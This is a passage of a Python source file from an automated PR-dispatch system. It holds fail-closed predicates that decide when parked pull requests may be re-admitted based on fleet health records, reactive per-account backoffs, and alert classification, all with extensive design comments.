    out-dated by anything), or ANY record that fails the shared _validate_record contract (an
    unreadable window is never read optimistically). Records stamped implausibly far in the
    FUTURE are skipped exactly as elsewhere, so a forged-future `success` cannot spring a park.

    The returned `key` is the RECOVERY EVENT's durable identity — provider/account/run — which the
    caller receipts on the PR; park_policy consumes it exactly once and can never re-earn a
    re-admission from it. It carries no raw handle (the account is the salted hash, locked
    decision 22a) and only park-receipt-safe characters."""
    if not isinstance(records, list) or not records:
        return None
    if (not isinstance(parked_at, (int, float)) or isinstance(parked_at, bool)
            or parked_at != parked_at or parked_at in (float("inf"), float("-inf"))):
        return None
    for record in records:
        try:
            _validate_record(record, ORIGIN_READ)
        except ValueError:
            return None
    cooldowns = auth_cooldowns(records, now)
    window = [record for record in sorted(records, key=lambda r: r["ts"])
              if record["ts"] <= now + FUTURE_SKEW_SECONDS]  # future-forged stamps prove nothing
    cause, last_fail = {}, {}
    for record in window:
        account = record["account"]
        if record["ts"] <= parked_at:
            cause[account] = record      # newest record at/before the park application
        if record["exit_class"] in PARK_STARVATION_CLASSES:
            last_fail[account] = record["ts"]
    recovery = {}
    for record in window:
        account = record["account"]
        if (record["exit_class"] == SUCCESS and account not in recovery
                and record["ts"] > parked_at
                and record["ts"] > last_fail.get(account, float("-inf"))):
            recovery[account] = record   # earliest success after the park AND the last failure
    candidates = [
        (record["ts"], account, record)
        for account, record in recovery.items()
        if account in cause
        and cause[account]["exit_class"] in PARK_STARVATION_CLASSES
        and account not in cooldowns
    ]
    if not candidates:
        return None
    ts, account, record = min(candidates)
    return {
        "key": f"{record['provider']}/{account}/{record.get('run_id') or int(ts)}",
        "recovered_at": _iso_z(ts),
        "provider": record["provider"],
        "account": account,
        "cause": cause[account]["exit_class"],
    }


def park_cause_provable(records, parked_at, now):
    """True when a capacity park applied at `parked_at` could EVER prove its cause recovered —
    i.e. SOME account's newest record at or before `parked_at` is a PARK_STARVATION_CLASSES
    signal, so a later success can satisfy capacity_recovery_evidence.

    This exists for ONE caller: the legacy-park migration (sparq-org/sparq#3809). Converting a
    park from the human terminal into the machine class is only an improvement if the machine
    class can actually release it. capacity_recovery_evidence fixes the park's cause at the
    park's application instant: if the fleet was HEALTHY at that instant, no account's
    newest-at-park record is a starvation signal, condition 1 can never be satisfied, and NO
    future success can ever recover that park. Converting then would trade a VISIBLE stall
    (`review:needs-user`, which a human sees and can clear) for a SILENT one (`review:parked`,
    which nothing will ever clear) — strictly worse.

    So the migration converts only while the starvation cause is still OBSERVABLE, and defers to
    a later tick otherwise. It is a precondition check, never a grant: it proves the exit is
    REACHABLE, and capacity_recovery_evidence still has to be satisfied on its own terms before
    anything is actually re-admitted.

    Fails toward False (do not migrate) on every ambiguity, exactly like the evidence gate."""
    if not isinstance(records, list) or not records:
        return False
    if (not isinstance(parked_at, (int, float)) or isinstance(parked_at, bool)
            or parked_at != parked_at or parked_at in (float("inf"), float("-inf"))):
        return False
    for record in records:
        try:
            _validate_record(record, ORIGIN_READ)
        except ValueError:
            return False
    cause = {}
    for record in sorted(records, key=lambda r: r["ts"]):
        if record["ts"] > now + FUTURE_SKEW_SECONDS:
            continue                    # future-forged stamps prove nothing
        if record["ts"] <= parked_at:
            cause[record["account"]] = record
    return any(record["exit_class"] in PARK_STARVATION_CLASSES for record in cause.values())


def _readable_window(records, now):
    """The validated, non-future slice of a health window, or None when ANY record fails the
    shared _validate_record contract (an unreadable window is never read optimistically) or the
    window is empty/not a list. One helper so every aged-out-park predicate below fails closed in
    exactly the same way capacity_recovery_evidence / park_cause_provable already do."""
    if not isinstance(records, list) or not records:
        return None
    for record in records:
        try:
            _validate_record(record, ORIGIN_READ)
        except ValueError:
            return None
    return sorted((record for record in records
                   if record["ts"] <= now + FUTURE_SKEW_SECONDS),
                  key=lambda r: r["ts"])


def _account_newest(window):
    """{account: newest record} over an already-sorted, already-validated window."""
    newest = {}
    for record in window:
        newest[record["account"]] = record
    return newest


# --- [registry #691] THE AGED-OUT PARK EXIT ---------------------------------------------------
#
# THE LIVENESS GAP. capacity_recovery_evidence fixes a park's cause at its APPLICATION INSTANT:
# condition 1 asks "was some account failing at `parked_at`?". park_cause_provable is the honest
# precondition that stops the legacy migration converting a park whose condition 1 can never be
# satisfied. Both are correct. Together they leave a park with NO machine exit in exactly the
# state the loop spends most of its life in — a HEALTHY fleet:
#   * a park applied while the fleet was healthy can never satisfy condition 1 (measured
#     2026-07-25: every one of the 32 sparq legacy parks deferred with "cause is machine-owned,
#     but no starvation cause is observable"), and
#   * a park older than the window (prune's WINDOW_HOURS = 48) has no record at or before
#     `parked_at` AT ALL, so its cause is unobtainable forever (registry #691).
# A hold with no machine exit turns a transient outage into a PERMANENT stall. So an aged-out
# park needs an exit whose precondition is provable from state that STILL EXISTS.
#
# THIS IS A HEURISTIC, NOT EVIDENCE — SAY SO. capacity_recovery_evidence proves a specific claim
# ("the account that was failing when this park landed has since succeeded"). The predicate below
# proves a DIFFERENT, WEAKER claim: "the fleet is demonstrably healthy now and has been for
# SUSTAINED_HEALTH_SPAN_SECONDS". That is a PROXY for "whatever starved this PR is not starving
# the fleet any more" — the same kind of labelled proxy as the burn-rate estimate elsewhere in
# this repo, and it is labelled here for the same reason. It is deliberately used ONLY where the
# genuine proof is unobtainable (see dispatch-claim._capacity_recovery_probe: the strong gate is
# tried first, and the proxy is refused outright while the strong gate is still REACHABLE).
#
# WHY EACH BOUND (all measured against the live ledger, 2026-07-25/26, 200 records / 19.1 h):
#  * SPAN 6 h > BACKOFF_CAP_SECONDS (5 h). An account sidelined by a MAXIMAL reactive backoff
#    records nothing while it is held; a span shorter than the cap could therefore be entirely
#    covered by one account's silence. Six hours means a maximally-backed-off account has had to
#    come back and record something inside the span.
#  * COVERAGE. The retained window must itself reach back to the start of the span — claiming six
#    healthy hours from three observed ones is the exact dishonesty this predicate must not
#    commit. Under-coverage DEFERS; it never releases. THE CHECK IS UNCHANGED AND STILL LOAD
#    BEARING; what changed (registry #699) is that it is no longer rate-fragile.
#
#    THE LIMITATION THIS USED TO CARRY, AND WHY IT IS GONE (registry #699, FIXED). Retention was
#    by COUNT alone, so coverage was MAX_RECORDS / record-rate and the check held only while the
#    fleet stayed at or below MAX_RECORDS / SPAN = 200/6h = ~33 records/h. Both sides of that line
#    were observed on 2026-07-26 within one hour: at 11.2 rec/h (200 records / 17.9 h) this
#    predicate fired; at 61.5 rec/h (200 records / 3.25 h) it correctly refused, because covering
#    6 h at that rate would need ~369 records and the cap was 200. Live at the time of the fix:
#    200 records / 6.69 h = 29.9 rec/h — 41 minutes of span and 11% of rate headroom from the trip
#    line. Because a higher record rate is exactly what more throughput produces, the count cap
#    made the 60/60 throughput goal anti-correlated with keeping this exit open.
#    prune now retains max(count-cap, TIME FLOOR): every record inside RETENTION_FLOOR_SECONDS
#    (7 h = this SPAN + a 1 h margin) survives regardless of count, so coverage no longer depends
#    on the rate at all. The residual bound is the ABSOLUTE ceiling
#    (RETENTION_CEILING_RECORDS / RETENTION_CEILING_BYTES, ~285 records/h): above it the oldest
#    non-preserved records are evicted and coverage can fall under the span again — but prune says
#    so LOUDLY (a ::warning:: naming the condition, the binding bound and the resulting coverage),
#    and the failure direction is unchanged: under-coverage DEFERS, it never releases.
#  * FRESHNESS 1 h. Silence is NOT health: a fleet that recorded nothing for hours is unobserved,
#    not proven. Requiring a SUCCESS inside the last hour is what makes "the fleet works" a
#    present-tense claim. (Measured: the live ledger contains a 4.6 h silent gap; during it this
#    predicate correctly yields nothing.)
#  * >=6 SUCCESSES from >=2 DISTINCT REAL ACCOUNTS. One account succeeding proves that account
#    works, not that the fleet does. Measured over the last 6 h: 47 successes across 3 accounts.
#    THE `fleet` PSEUDO-PROVIDER IS EXCLUDED FROM THE DISTINCT-ACCOUNT COUNT (review of PR #697).
#    It writes its records under a FIXED sentinel hash (sha256("fleet-zero-dispatch")[:16]) which
#    is a valid `account` value like any other, so without this exclusion ONE real account plus
#    the dispatcher clears a floor whose entire stated purpose is that one account is not a
#    fleet. Counterexample against the first cut, by execution: 6 successes / 2 distinct
#    `account` values / 1 distinct REAL account minted `{"cause": "aged-out"}`. Live prevalence
#    makes it load-bearing rather than theoretical: 43 of today's 200 records are `fleet`
#    successes. Its successes still count toward MIN_SUCCESSES and toward freshness — a `fleet`
#    success means the allocator PLANNED AND LAUNCHED work, which is genuine evidence about the
#    dispatch starvation these parks are mostly made of; it simply is not a second ACCOUNT.
#    NOTE the floor is deliberately NOT described as mirroring OUTAGE_MIN_ACCOUNTS: the two
#    cannot be symmetric, because the recorder refuses any `fleet` record outside
#    {zero-dispatch, success}, so the pseudo-provider can inflate the HEALTH side and by
#    construction never the OUTAGE side.
#  * ZERO LAUNCH_FAIL_CLASSES IN THE SPAN, and NO account whose NEWEST record in the WHOLE window
#    is a launch failure. The first says nothing broke during the proven-healthy stretch; the
#    second catches the account that failed just BEFORE the span and has been silent since (its
#    backoff expired but it never came back). Measured: the last launch failure is 17.2 h old, so
#    the live fleet passes — and it correctly FAILED throughout the 2026-07-25 acct01 auth outage.
#  * NO ACTIVE auth cooldown (#604), exactly as capacity_recovery_evidence condition 3: a
#    credential the allocator is still holding back has demonstrably not recovered.
# `zero-dispatch` is deliberately NOT disqualifying. It is the allocator legitimately finding
# nothing to launch and fires constantly in normal operation (34 of 200 records); treating it as
# ill health would make this predicate unsatisfiable, which is a stall dressed as a guard. It is
# covered instead by the POSITIVE requirement that real successes accumulate.
SUSTAINED_HEALTH_SPAN_SECONDS = 6 * 3600
SUSTAINED_HEALTH_FRESH_SECONDS = 60 * 60
SUSTAINED_HEALTH_MIN_SUCCESSES = 6
SUSTAINED_HEALTH_MIN_ACCOUNTS = 2
# The `cause` this evidence reports. Never a decision class: it is NOT a cleared exit class, it is
# "the park's own cause aged out of the window and the fleet is healthy instead".
SUSTAINED_HEALTH_CAUSE = "aged-out"
# The evidence-key namespace. Distinct from capacity_recovery_evidence's `provider/account/run`
# so the two can never collide in the receipt set a PR consumes (park_policy refuses an evidence
# key it has already receipted), and so a receipt says on its face WHICH gate released the park.
SUSTAINED_HEALTH_KEY_PREFIX = "fleet-health"
# [registry #699] THE COUPLING between prune's retention floor and this span, machine-checked at
# import so the two constants cannot drift apart in a later edit. The floor bounds the OLDEST
# RETAINED RECORD, not the coverage: at a floor of exactly SPAN the oldest survivor sits somewhere
# INSIDE the span and the coverage check below still refuses, so the floor must exceed the span by
# a margin big enough to absorb the inter-record gap at the floor boundary. A violation here is a
# configuration error that would silently reinstate registry #699, so it fails LOUD at import
# rather than at the first park that needed the exit.
if RETENTION_FLOOR_SECONDS < SUSTAINED_HEALTH_SPAN_SECONDS + RETENTION_FLOOR_MARGIN_SECONDS:
    raise RuntimeError(
        f"model-health retention floor ({RETENTION_FLOOR_SECONDS}s) must exceed the "
        f"sustained-health span ({SUSTAINED_HEALTH_SPAN_SECONDS}s) by at least "
        f"{RETENTION_FLOOR_MARGIN_SECONDS}s — otherwise the aged-out park exit (registry "
        "#691/#699) can never observe the coverage it requires")


def health_window_coverage_seconds(window, now):
    """Wall-clock the ALREADY-PRUNED `window` reaches back from `now`, i.e. the span it can
    honestly speak about. 0 for an empty/unusable window. This is the quantity the coverage clause
    of sustained_fleet_health_evidence compares against SUSTAINED_HEALTH_SPAN_SECONDS."""
    stamps = [r["ts"] for r in window
              if isinstance(r, dict) and isinstance(r.get("ts"), int)
              and not isinstance(r.get("ts"), bool)]
    return max(0, now - min(stamps)) if stamps else 0


def sustained_health_coverage_shortfall(window, now):
    """None when the pruned window covers the sustained-health span; otherwise a dict describing
    WHY the aged-out exit cannot open — including whether the shortfall is RETENTION-bound.

    WHY THIS EXISTS (registry #699). A refusal for under-coverage and a refusal because the parks
    are simply younger than the span produce the SAME `no-evidence` census row, and that ambiguity
    caused a wrong operational conclusion on 2026-07-26. Since prune gained the time floor, an
    under-covered window has exactly two causes and they are distinguishable: the ledger is young
    or sparse (nothing to fix — it fills in on its own), or the ABSOLUTE retention ceiling is
    binding (a real, actionable capacity condition). `retention_bound` is that discriminator; the
    caller logs it once per tick rather than once per park."""
    coverage = health_window_coverage_seconds(window, now)
    if coverage >= SUSTAINED_HEALTH_SPAN_SECONDS:
        return None
    return {
        "coverage_seconds": coverage,
        "span_seconds": SUSTAINED_HEALTH_SPAN_SECONDS,
        "records": len(window),
        "retention_bound": (len(window) >= RETENTION_CEILING_RECORDS
                            or _ledger_bytes(window) >= RETENTION_CEILING_BYTES),
    }


def _fleet_health_ok(window, now):
    """The FLEET-side half of the aged-out exit, shared by the evidence gate and its reachability
    twin: no launch failure inside the proven span, no account left sitting on a launch failure,
    and no active auth cooldown. Returns True/False; never raises."""
    if not window:
        return False
    span_start = now - SUSTAINED_HEALTH_SPAN_SECONDS
    if any(record["exit_class"] in LAUNCH_FAIL_CLASSES
           for record in window if record["ts"] > span_start):
        return False                    # something broke inside the proven-healthy stretch
    if any(record["exit_class"] in LAUNCH_FAIL_CLASSES
           for record in _account_newest(window).values()):
        return False                    # an account that failed and never came back
    return not auth_cooldowns(window, now)


def sustained_fleet_health_evidence(records, parked_at, now):
    """HEURISTIC (not proof of THIS park's cause) evidence that a capacity park whose own
    starvation cause is unobtainable may be re-admitted: the fleet has been demonstrably healthy
    for SUSTAINED_HEALTH_SPAN_SECONDS and is producing successful runs right now.

    Returns the same shape capacity_recovery_evidence returns — {"key", "recovered_at",
    "provider", "account", "cause"} — so park_policy.capacity_park_admission consumes it through
    the IDENTICAL path: same strictly-after-the-park ordering check, same receipt, same
    consumed-exactly-once rule (the key is the anchoring success's durable identity, so it can
    never be re-earned), same AUTO_READMISSION_MAX cap, and the same unconditional refusal on any
    human-owned hold, on a park a human applied by stamping a HUMAN-owned terminal, and on a
    human-applied machine park that no bot park-reason receipt ever classified `class=capacity`
    (park_policy.human_park_capacity_proof). This adds an evidence SOURCE; it widens no gate.

    The predicate, exactly (ALL must hold):
      0. the window is readable and every record passes _validate_record, and `parked_at` is
         finite — every ambiguity yields None, as everywhere else here;
      1. the park is at least SUSTAINED_HEALTH_SPAN_SECONDS old. A fresh park is the STRONG
         gate's business, not this one;
      2. the retained window reaches back to the start of the span (coverage — see the block
         comment: an under-covered window cannot honestly claim a full span of health);
      3. no LAUNCH_FAIL_CLASSES record inside the span, no account whose newest record in the
         window is a launch failure, and no ACTIVE auth cooldown (_fleet_health_ok);
      4. at least SUSTAINED_HEALTH_MIN_SUCCESSES success records inside the span, from at least
         SUSTAINED_HEALTH_MIN_ACCOUNTS distinct REAL accounts — the `fleet` pseudo-provider's
         fixed sentinel hash is excluded from the DISTINCT count (it is the dispatcher, not a
         second account) while its successes still count toward the total; and
      5. the NEWEST of those successes is within SUSTAINED_HEALTH_FRESH_SECONDS of `now` — the
         fleet works in the present tense, not merely at some point in the span.
    The newest qualifying success anchors the evidence (ties broken by account fingerprint then
    run id) so the answer is deterministic. Every counted success is strictly after `parked_at`
    BY CONSTRUCTION rather than by a separate test — condition 1 already forces
    `parked_at <= span_start` and condition 4 only counts records after `span_start` — and
    capacity_park_admission re-checks the ordering independently anyway. A redundant
    `ts > parked_at` clause here would be a guard no input could ever exercise.

    HONESTY NOTE on the no-active-cooldown clause of condition 3: it is DELIBERATELY REDUNDANT
    with the no-launch-failure-in-span clause. An active auth cooldown lasts
    AUTH_COOLDOWN_SECONDS, so it always implies an `auth` record inside a span this long, which
    the earlier clause has already refused. It is kept for the same reason
    capacity_recovery_evidence keeps its deliberately-overlapping condition 3 (both are cheap,
    neither is relied on alone, and it would survive a future narrowing of LAUNCH_FAIL_CLASSES) —
    but it is NOT an independently reachable guard and the self-test does not pretend it is.

    Records stamped implausibly far in the FUTURE are skipped exactly as elsewhere, so a
    forged-future success can neither anchor this evidence nor manufacture freshness."""
    window = _readable_window(records, now)
    if window is None:
        return None
    if (not isinstance(parked_at, (int, float)) or isinstance(parked_at, bool)
            or parked_at != parked_at or parked_at in (float("inf"), float("-inf"))):
        return None
    span_start = now - SUSTAINED_HEALTH_SPAN_SECONDS
    if parked_at > span_start:
        return None                     # too fresh: the strong gate owns this park
    if window[0]["ts"] > span_start:
        return None                     # the window does not cover the span it would claim
    if not _fleet_health_ok(window, now):
        return None
    successes = [record for record in window
                 if record["exit_class"] == SUCCESS and record["ts"] > span_start]
    if len(successes) < SUSTAINED_HEALTH_MIN_SUCCESSES:
        return None
    if len({record["account"] for record in successes
            if record["provider"] != FLEET_PSEUDO_PROVIDER}) < SUSTAINED_HEALTH_MIN_ACCOUNTS:
        return None
    anchor = max(successes,
                 key=lambda r: (r["ts"], r["account"], r.get("run_id") or ""))
    if anchor["ts"] < now - SUSTAINED_HEALTH_FRESH_SECONDS:
        return None                     # silence is not health
    return {
        "key": (f"{SUSTAINED_HEALTH_KEY_PREFIX}/{anchor['provider']}/{anchor['account']}/"
                f"{anchor.get('run_id') or int(anchor['ts'])}"),
        "recovered_at": _iso_z(anchor["ts"]),
        "provider": anchor["provider"],
        "account": anchor["account"],
        "cause": SUSTAINED_HEALTH_CAUSE,
    }


def sustained_health_exit_reachable(records, now):
    """True when the aged-out exit above CAN open for a park applied now — the MIGRATION-side
    twin of sustained_fleet_health_evidence, and never a grant.

    It asks the reachability question only: is the health ledger readable, does it COVER the span
    the evidence gate will have to claim, is the fleet OBSERVED working right now (a success
    inside SUSTAINED_HEALTH_FRESH_SECONDS), and is nothing currently broken (_fleet_health_ok)?

    WHICH OF THE EVIDENCE GATE'S CONDITIONS BELONG HERE, AND WHY (review round 3 of PR #697 — I
    got this wrong, and the correction is the useful part). The gate has three conditions this
    twin might omit, and the test is NOT "is it required?" but "can a park WAIT for it?":
      * SPAN — WAITABLE. It is a clock property: the park ages into it by doing nothing. Omitted.
      * COUNT (successes / distinct real accounts) — WAITABLE. Successes accumulate while the
        fleet keeps working, which is exactly what the freshness probe below has just observed.
        Omitted.
      * COVERAGE — **NOT WAITABLE, AND THIS IS THE WHOLE POINT.** Coverage is a property of the
        LEDGER'S RETENTION, not of elapsed time: waiting never improves it. Under the old
        count-only retention it was MAX_RECORDS / record-rate, so a BUSIER fleet made it strictly
        worse; since registry #699 gave prune a time floor it is rate-independent up to the
        absolute retention ceiling, and only that ceiling can still shrink it. Either way waiting
        does not fix it, so the check stays. Omitting it made
        this predicate fail OPEN: at a measured 62 rec/h (coverage 3.2 h) it returned True while
        sustained_fleet_health_evidence returned None at +1, +2, +4 AND +8 spans — so the
        migration would convert a park into a class with BOTH exits shut. That is verbatim the
        harm park_exit_reachable exists to prevent: a VISIBLE stall a human can clear traded for
        a SILENT one nothing will ever clear. REQUIRED here.
    THE GENERAL RULE, because this was the third instance of one reasoning error in this PR:
    "condition X is deliberately not required here" is a claim about EVERY path that consumes the
    predicate. Establish waitability for X specifically, on each path — never generalise it from
    a sibling condition that happens to be waitable.

    Fails toward False on every ambiguity (unreadable/empty window, a window too short to cover
    the span, a stale or absent success, a live cooldown, an account sitting on a launch
    failure), exactly like park_cause_provable."""
    window = _readable_window(records, now)
    if window is None:
        return False
    if window[0]["ts"] > now - SUSTAINED_HEALTH_SPAN_SECONDS:
        return False                    # the ledger cannot supply the span; waiting never fixes it
    if not _fleet_health_ok(window, now):
        return False
    return any(record["exit_class"] == SUCCESS
               and record["ts"] >= now - SUSTAINED_HEALTH_FRESH_SECONDS
               for record in window)


def park_exit_reachable(records, parked_at, now):
    """Does a capacity park applied at `parked_at` have ANY machine exit that can still open?

    THE ONE precondition the legacy-park migration asks (dispatch-claim), and the reason it is
    one function rather than two call-site booleans: the migration and the admission must agree
    about what "releasable" means or the migration converts parks into a class that cannot
    release them. It is the disjunction of exactly the two exits the admission probe offers, in
    the same order the probe tries them:
      * park_cause_provable — the STRONG exit: this park's own starvation cause is observable, so
        a later success can prove it recovered; or
      * sustained_health_exit_reachable — the AGED-OUT exit: the park's own cause is (or will be)
        unobtainable, but the labelled fleet-health proxy can open for it.
    False on every ambiguity, so an unreadable ledger defers the migration exactly as before."""
    return bool(park_cause_provable(records, parked_at, now)
                or sustained_health_exit_reachable(records, now))


def account_backoffs(records, now):
    """Reactive per-account backoff for probe-exempt providers (maintainer decision 2026-07-17,
    registry issue #29), DERIVED purely from the pruned health window. Walks records in ts order:
    a limit/transient (rate-limit) record, including a derived cross-issue no_change limit, starts
    or extends the account's backoff — the provider's parseable reset hint when present, else
    BACKOFF_BASE_SECONDS doubling per CONSECUTIVE hit — and a SUCCESS record clears the account
    (multiplier reset). Every duration is clamped to
    [record_ts, record_ts + BACKOFF_CAP_SECONDS], and record_ts itself may sit at most
    FUTURE_SKEW_SECONDS ahead of `now` (cross-provider review r2 finding 2: the per-record clamp
    would otherwise let a forged far-future stamp yield a backoff far past the 5 h ceiling —
    future-forged records are skipped fail-open here, not just in prune, because this walk must
    not RELY on callers pre-pruning). The final clamp is against NOW (cross-provider review r3
    finding 1: a within-skew record at now+300 with a capped hint would otherwise end 5 minutes
    past the ceiling), so every returned backoff ends within now + BACKOFF_CAP_SECONDS — the cap
    is a hard bound on how long an account can be sidelined. Returns only ACTIVE backoffs:
    {account_hash: {"backoff_until", "consecutive", "saturated", "last_signal", "last_ts"}} —
    `saturated` means consecutive >= BACKOFF_CHAIN_KEEP, where prune may have truncated the
    chain, so the count is a lower bound (display "xN+", never an exact "xN")."""
    state = {}
    valid = []
    for record in records:
        if not isinstance(record, dict):
            continue
        acct, ts = record.get("account"), record.get("ts")
        if (not isinstance(acct, str) or not isinstance(ts, (int, float))
                or isinstance(ts, bool) or ts != ts or ts in (float("inf"), float("-inf"))
                or ts > now + FUTURE_SKEW_SECONDS):
            continue                # non-str acct / non-finite or future-forged ts: skip fail-open
        valid.append(record)
    # Defensive ts-sort (cross-provider review r1): the consecutive/success-reset walk is order-
    # sensitive; the production caller pre-prunes (which sorts), but do not RELY on callers.
    valid.sort(key=lambda r: r["ts"])
    valid, _ = _no_change_limit_view(valid, now)
    for record in valid:
        acct, cls, ts = record.get("account"), record.get("exit_class"), record.get("ts")
        if cls == SUCCESS:
            state.pop(acct, None)                   # a successful run resets the multiplier
        elif cls in BACKOFF_CLASSES:
            consecutive = state.get(acct, {}).get("consecutive", 0) + 1
            exponential = ts + min(BACKOFF_BASE_SECONDS * (2 ** (consecutive - 1)),
                                   BACKOFF_CAP_SECONDS)
            hinted = parse_reset_hint(record.get("reset_hint"), ts)
            until = exponential if hinted is None else min(max(hinted, ts),
                                                           ts + BACKOFF_CAP_SECONDS)
            until = min(until, now + BACKOFF_CAP_SECONDS)   # the 5 h cap binds relative to NOW:
            # a within-skew future ts (clock drift, <= now + FUTURE_SKEW_SECONDS) must not let a
            # capped hint/exponential end past the ceiling (cross-provider review r3 finding 1)
            state[acct] = {"backoff_until": int(until), "consecutive": consecutive,
                           # At/past cap-saturation, prune may have truncated this chain to its
                           # BACKOFF_CHAIN_KEEP tail, so a re-derived count is a LOWER BOUND —
                           # a 20-hit chain re-derives as 6 (PR #85 finding 2). Consumers must
                           # render a saturated count as "x6+", never as an exact "x6".
                           "saturated": consecutive >= BACKOFF_CHAIN_KEEP,
                           "last_signal": cls, "last_ts": int(ts)}
        # other classes (auth/setup/unknown/raw no_change) neither extend nor clear THIS chain
    active = {acct: b for acct, b in state.items() if b["backoff_until"] > now}
    # AUTH COOLDOWN overlay (registry #596). Derived in a SEPARATE pass and merged by LATEST end so
    # the limit/transient exponential chain above is untouched: folding `auth` into that walk would
    # have let an interleaved auth record inflate the `consecutive` multiplier (and therefore the
    # 5 h-capped exponential) of an unrelated rate-limit chain. A cooldown never SHORTENS a live
    # backoff — only extends when it ends later.
    for acct, cooldown in auth_cooldowns(valid, now).items():
        current = active.get(acct)
        if current is None or cooldown["backoff_until"] > current["backoff_until"]:
            active[acct] = cooldown
    return active


def classify_records(records, provider_accounts, now, open_alerts=()):
    """The PURE decision core. Given the pruned record window and `provider_accounts`
    ({provider: set-of-enabled-salted-hashes}, the enabled fleet per provider), return a list of
    ACTIONS. Each action = {condition, provider, fire (bool), reason, reset_hint?}. `fire=True`
    means raise/refresh the alert; `fire=False` means recover/close an existing one. RECOVERY is a
    first success after failures within the window.

    `open_alerts` is the set of (condition, provider) pairs whose alert issue is currently OPEN
    (issue #205). Actions are keyed on records, but a provider whose records have all aged out of
    the rolling window would otherwise produce NO action at all — so its open alert could stay
    open forever. For every open marker the record-driven pass did not already
    cover — AND whose provider has no records left in the window at all — an explicit recovery
    (fire=False) is emitted so `decide` can close it. Alerts for a provider still present in the
    window are left to the per-condition logic above (closing on absent side-knowledge, e.g. a
    momentarily-empty fleet map, would be a false recovery, not evidence of health).

    Conditions:
      provider-outage    : >=3 launch fails in 30 min from >= max(2, ceil(enabled-fleet/2))
                           distinct accounts, per-account runs unbroken by their OWN success.
      persistent-transient: >=5 transient/unknown fails in 15 min (even one account).
      provider-capped    : EVERY enabled account's LATEST limit/success outcome is limit-class.
      account-auth-cooldown: >=AUTH_COOLDOWN_MIN consecutive `auth` outcomes put one or more of the
                           provider's accounts in a bounded credential cooldown (registry #596).
      zero-dispatch      : >=3 consecutive zero-dispatch ticks (provider == 'fleet'). An `idle`
                           tick (an empty ready frontier — issue #341) BREAKS the run, so a newest
                           `idle` recovers at once and re-entry needs a fresh threshold-length run.
    """
    records, _ = _no_change_limit_view(records, now)
    # Live per-account credential cooldowns (registry #596), derived from the SAME window. Keyed by
    # salted fingerprint; mapped onto providers inside the per-provider loop below.
    cooldowns = auth_cooldowns(records, now)
    actions = []
    providers = {r["provider"] for r in records if isinstance(r.get("provider"), str)}

    for provider in sorted(providers):
        # Ordered by RECORD time so "later" is well defined for the per-account invalidation
        # rules below (prune() sorts, but classify_records must not rely on caller ordering).
        prov_records = sorted((r for r in records if r.get("provider") == provider),
                              key=lambda r: r["ts"])
        if not prov_records:
            continue

        # ---- zero-dispatch (fleet pseudo-provider) --------------------------------------------
        # Consecutiveness is over the TICK SEQUENCE: dispatch.yml records a dispatch-SUCCESS
        # record on every productive planned>0 tick (review defect #5), so the tail run below
        # resets on a real dispatch and the fire=False action closes an open alert.
        if provider == "fleet":
            # [#341] An `idle` tick (empty ready frontier) is a BOUNDARY, exactly as a productive
            # dispatch-success is. The condition being counted is "the dispatcher launched nothing
            # WHILE WORK WAS READY"; an `idle` tick is a POSITIVE observation that no work was
            # ready, so it is not absence of evidence (which is what an unrecorded pre-#341 empty
            # tick was) — it is evidence that the condition did not hold on that tick, and a tick
            # where the condition did not hold cannot sit inside a run of consecutive ticks where
            # it did.
            #
            # This is also what keeps recovery from FLAPPING. Treating `idle` as transparent while
            # still recovering on a newest-`idle` tick is asymmetric: `zd, zd, zd, idle` closes the
            # alert, and then a single `zd` reopens it on the spot because all three pre-idle
            # records are still in the tail — the threshold would mean nothing on re-entry. As a
            # boundary, the run restarts at the empty frontier and ZERO_DISPATCH_MIN fresh failing
            # ticks are required to page again.
            #
            # Immediate recovery falls out of the same rule rather than needing its own guard: a
            # newest `idle` breaks the scan at the first record, so the tail is empty and the alert
            # closes on the spot instead of waiting up to WINDOW_HOURS for the stale zero-dispatch
            # records to age out into #205's orphan path. `quiet` therefore only selects the reason
            # text — it says WHY the alert closed (nothing to launch vs. dispatch resumed).
            quiet = prov_records[-1].get("exit_class") == CLASS_IDLE
            zd_tail = []
            for r in reversed(prov_records):
                if r.get("exit_class") != CLASS_ZERO_DISPATCH:
                    break
                zd_tail.append(r)
            fire = len(zd_tail) >= ZERO_DISPATCH_MIN
            actions.append({
                "condition": "zero-dispatch",
                "provider": "fleet",
                "fire": fire,
                "reason": (f"{len(zd_tail)} consecutive ticks planned ready work but launched "
                           f"nothing (>= {ZERO_DISPATCH_MIN} pages)" if fire
                           else "the ready frontier is empty — there is no work to launch" if quiet
                           else "dispatch is placing work again"),
            })
            continue

        last_cls = prov_records[-1].get("exit_class")
        recovered = last_cls == SUCCESS

        # ---- provider-outage -------------------------------------------------------------------
        # Per-account tail runs (a success clears only ITS account) compared against the ENABLED
        # fleet size from the account catalog; when the catalog is unavailable, fall back to the
        # accounts OBSERVED in the window. Deliberate fail-safe misses are documented at the
        # OUTAGE_* threshold block above.
        tails = _per_account_tail_failures(prov_records, OUTAGE_WINDOW_SECONDS, now)
        total_fails = sum(len(v) for v in tails.values())
        enabled = provider_accounts.get(provider) or set()
        observed = {r["account"] for r in prov_records if isinstance(r.get("account"), str)}
        fleet_size = len(enabled) if enabled else len(observed)
        need_accounts = _outage_required_accounts(fleet_size)
        outage = total_fails >= OUTAGE_MIN_FAILS and len(tails) >= need_accounts
        actions.append({
            "condition": "provider-outage",
            "provider": provider,
            "fire": bool(outage),
            "reason": (f"{total_fails} model-launch failures across {len(tails)} of "
                       f"{fleet_size} accounts in {OUTAGE_WINDOW_SECONDS // 60} min with no "
                       "per-account successes" if outage
                       else "the failing-account set is below the fleet outage threshold"),
        })

        # ---- persistent-transient --------------------------------------------------------------
        # `unknown` counts here (transient-for-persistence): a sustained burst of unattributable
        # failures still degrades throughput even though it can never page an OUTAGE.
        transient_recent = [
            r for r in prov_records
            if r.get("exit_class") in PERSISTENCE_CLASSES
            and (now - r["ts"]) <= TRANSIENT_WINDOW_SECONDS]
        persistent = len(transient_recent) >= TRANSIENT_MIN_FAILS
        # Failure-class composition (review #72 finding 2): the persistence bucket mixes
        # provider-attributed transients (429/529/overloaded) with UNATTRIBUTABLE `unknown`
        # failures (timeouts/cancellations/pre-launch aborts). The advice layer needs the split:
        # a green status page only supports a self-induced-rate-limit diagnosis when the burst
        # was actually attributed to rate limits.
        counts = {cls: sum(1 for r in transient_recent if r.get("exit_class") == cls)
                  for cls in (CLASS_TRANSIENT, CLASS_UNKNOWN)}
        composition = ", ".join(f"{counts[c]} {c}"
                                for c in (CLASS_TRANSIENT, CLASS_UNKNOWN) if counts[c])
        actions.append({
